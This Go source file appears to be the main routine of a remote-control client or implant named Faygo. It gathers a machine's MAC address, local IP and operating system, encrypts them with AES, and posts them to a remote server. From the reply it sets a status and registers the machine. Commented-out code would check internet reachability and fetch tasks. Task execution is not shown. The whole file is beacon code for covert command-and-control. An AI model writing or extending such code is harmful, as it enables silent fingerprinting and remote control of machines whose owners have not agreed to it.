package main

import (
	net "Faygo/client/module/net"
	"fmt"
	"runtime"
)

func main() {
	//test()

	// 基本标识信息赋值
	c1 := Client{
		Mac: GetMac(),
		Lan: GetIP(),
		Os:  runtime.GOOS,
	}

	// GetTask(c1)

	// 判断是否出网
	// // fmt.Println(GetServer())
	// if !GetServer() {
	// 	os.Exit(0)
	// }

	// 获取信息 返回状态吗
	response := c1.GetStatus()
	fmt.Println(response)
	dealtask := Client{}
	dealtask.Json2Struct(response)
	switch dealtask.Status {
	// case 0 需要初始化
	case 0:
		fmt.Println(c1.InitClient())
	case 1:
		fmt.Println("case1")
	default:
		fmt.Println("error")
	}

}

//OK
func GetServer() bool {
	//判断返回字符串
	// return net.HttpGet(RemoteHost) == "{\"0\":\"0\"}"
	return net.HttpGet(RemoteHost) == "200 OK"
}

func (c *Client) GetStatus() string {
	//debug
	fmt.Println(AesEnCode(Struct2Json(*c)))
	return AesDeCode(net.HttpPost(RemoteHost, AesEnCode(Struct2Json(*c))))

}

func GetTask(c Client) {
	fmt.Println(Struct2Json(c))
	net.HttpPost(RemoteHost, AesEnCode(Struct2Json(c)))

}

func (c *Client) InitClient() string {
	c.Status = 1
	return AesDeCode(net.HttpPost(RemoteHost, AesEnCode(Struct2Json(*c))))

}
